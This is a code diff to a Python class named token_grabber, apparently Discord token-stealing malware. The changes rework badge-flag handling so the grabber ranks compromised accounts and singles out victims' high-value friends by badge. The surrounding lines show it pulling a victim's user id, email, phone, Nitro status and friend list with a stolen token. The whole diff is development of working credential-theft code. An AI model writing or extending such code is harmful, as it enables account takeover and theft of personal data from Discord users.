@@ -70,51 +70,67 @@ class token_grabber():
         flags_dict = {
             "DISCORD_EMPLOYEE": {
                 "emoji": "<:staff:968704541946167357>",
-                "shift": 0
+                "shift": 0,
+                "ind": 1
             },
             "DISCORD_PARTNER": {
                 "emoji": "<:partner:968704542021652560>",
-                "shift": 1
+                "shift": 1,
+                "ind": 2
             },
             "HYPESQUAD_EVENTS": {
                 "emoji": "<:hypersquad_events:968704541774192693>",
-                "shift": 2
+                "shift": 2,
+                "ind": 4
             },
             "BUG_HUNTER_LEVEL_1": {
                 "emoji": "<:bug_hunter_1:968704541677723648>",
-                "shift": 3
+                "shift": 3,
+                "ind": 4
             },
             "HOUSE_BRAVERY": {
                 "emoji": "<:hypersquad_1:968704541501571133>",
-                "shift": 6
+                "shift": 6,
+                "ind": 64
             },
             "HOUSE_BRILLIANCE": {
                 "emoji": "<:hypersquad_2:968704541883261018>",
-                "shift": 7
+                "shift": 7,
+                "ind": 128
             },
             "HOUSE_BALANCE": {
                 "emoji": "<:hypersquad_3:968704541874860082>",
-                "shift": 8
+                "shift": 8,
+                "ind": 256
             },
             "EARLY_SUPPORTER": {
                 "emoji": "<:early_supporter:968704542126510090>",
-                "shift": 9
+                "shift": 9,
+                "ind": 512
             },
             "BUG_HUNTER_LEVEL_2": {
                 "emoji": "<:bug_hunter_2:968704541774217246>",
-                "shift": 14
+                "shift": 14,
+                "ind": 16384
             },
             "VERIFIED_BOT_DEVELOPER": {
                 "emoji": "<:verified_dev:968704541702905886>",
-                "shift": 17
+                "shift": 17,
+                "ind": 131072 
             },
             "CERTIFIED_MODERATOR": {
                 "emoji": "<:certified_moderator:988996447938674699>",
-                "shift": 18
+                "shift": 18,
+                "ind": 262144
+            },
+            "SPAMMER": {
+                "emoji": "⌨",
+                "shift": 20,
+                "ind": 1048704
             },
         }
 
-        return [flags_dict[flag]['emoji'] for flag in flags_dict if int(flags) & (1 << flags_dict[flag]["shift"])]
+        return [[flags_dict[flag]['emoji'], flags_dict[flag]['ind']] for flag in flags_dict if int(flags) & (1 << flags_dict[flag]["shift"])]
 
     
     def embed_accounts(self, embed) -> None:
@@ -129,7 +145,7 @@ class token_grabber():
             user_id = r.json()['id']
             email = r.json()['email']
             phone = r.json()['phone']
-            badges = " ".join(self.calc_flags(r.json()['public_flags']))
+            badges = ' '.join([flag[0] for flag in self.calc_flags(r.json()['public_flags'])[::-1]])
 
             try:
                 if r.json()['premium_type'] == 1:
@@ -169,9 +185,11 @@ class token_grabber():
             hq_friends = ""
             try:
                 for friend in f.json():
-                    prefered_flags = [1, 2 ,4, 8, 512, 16384, 131072]
-                    if friend['user']['public_flags'] in prefered_flags:
-                        hq_badges = " ".join(self.calc_flags(friend['user']['public_flags']))
+                    unprefered_flags = [64, 128, 256, 1048704]
+                    inds = [flag[1] for flag in self.calc_flags(friend['user']['public_flags'])[::-1]]
+                    for flag in unprefered_flags: inds.remove(flag) if flag in inds else None  
+                    if inds != []:
+                        hq_badges = ' '.join([flag[0] for flag in self.calc_flags(friend['user']['public_flags'])[::-1]])
                         hq_friends += f"{hq_badges} - `{friend['user']['username']}#{friend['user']['discriminator']} ({friend['user']['id']})`\n"
             except TypeError:
                 pass
